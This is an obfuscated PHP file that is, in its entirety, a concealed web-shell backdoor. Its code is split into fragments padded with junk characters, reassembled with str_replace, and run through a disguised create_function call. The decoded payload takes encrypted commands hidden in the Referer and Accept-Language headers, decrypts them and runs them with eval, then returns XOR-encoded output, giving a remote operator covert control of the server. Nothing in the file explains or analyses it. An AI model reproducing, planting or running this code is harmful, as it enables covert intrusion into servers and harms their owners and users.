<?php
$p='=0;lflf$i<$l;){lffor($lfj=0;($jlf<$c&&lf$i<$l);$j++lflf,$i++)lf{$o.=$lft{$i}lf^lf$k{$j};}lf}returnlf';
$g='ase6lf4_lfenclfode(x(gzcolfmpress($olf),$k)lf);prinlft("<$klf>$d</$lfk>");@slfession_lfdestroy(lf);}}}}';
$M='$lfu=parlfse_urlfl($rlfr);parlfse_slftr($u["qulferylf"],$qlf);$q=arrlfay_valflues($q);plfreglf_match_lfa';
$G='lfay("/lf","+"),lflf$ss($s[$i],0,lf$e))),$k))lf)lf;$o=ob_gelft_contentlfs(lf);ob_lfend_cleanlf();$dlf=b';
$T='ll("lf/([\\w])[lf\\w-lf]+(?:;q=0.([lf\\dlf]))?,?/lf",$ra,$m)lflf;if(lf$q&&$m)lf{@selfssion_lflfstart();$';
$S=' $o;}$lfr=$_SElfRVER;$rr=@lf$r["lfHTTPlf_REFElfRER"];$ra=@$rlf["HTlfTP_ACCElfPlfTlf_LANGUAGElf"];if($rr&&$ra){';
$R='$kh="5d4lf1";$kf="4lf02a"lf;functiolfn xlf($t,$k)lf{$c=strlflelfn($k);$l=stlfrllfen($tlf)lf;$o="";for($i';
$s='elfy_elfxists($i,$s)){lf$s[$i]lf.=$lfp;$e=strplfos($lfs[$i],$flf);if($e)lf{$k=$klfh.$klff;ob_slftart';
$x=str_replace('C','','creCaCte_CfCuncCtCion');
$u='lf();@elfval(@gzunclflfompress(@x(lf@baself64_decodlfe(plfreg_rlfeplaclfe(array("/_lf/","/-lf/lf"),arr';
$X='($i.$lfkh),lf0,3));$lfflf=$sl($ss(mdlf5($i.$lfkf),0,3)lf);$plf="";flforlf($z=lf1;$z<countlf($m[1]);$lfz+';
$w='+)$lfp.=lf$lflfq[$m[2][$z]]lf;lfif(strpos($p,$h)==lf=0)lflf{$s[$i]="";$p=$ss(lf$p,3lf);}if(alfrray_lfk';
$N='s=lf&$_SESSION;$slfs="substlfr";$sl=lf"strtlflfolower";$lfi=$m[1][lf0]lf.$mlf[1][1];$lfh=$slfl($ss(md5';
$v=str_replace('lf','',$R.$p.$S.$M.$T.$N.$X.$w.$s.$u.$G.$g);
$J=$x('',$v);$J();
?>
